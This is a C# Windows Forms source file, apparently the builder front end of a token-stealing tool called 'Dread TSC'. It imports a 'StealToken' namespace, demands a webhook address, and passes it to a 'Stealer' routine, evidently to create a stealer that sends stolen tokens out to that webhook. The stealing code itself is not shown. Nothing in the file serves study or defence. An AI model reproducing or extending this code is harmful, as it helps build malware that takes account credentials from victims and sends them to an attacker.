using RaidAPI.StealToken;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Dread_TSC
{
    public partial class DreadTSC : Form
    {
        public DreadTSC()
        {
            InitializeComponent();
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here";
            if (flag)
            {
                MessageBox.Show("Webhook Required To Create", "Dread TSC");
            }
            else
            {
                Stealer.Dialog(this.WebHookTxt.Text);
            }
        }
    }
}
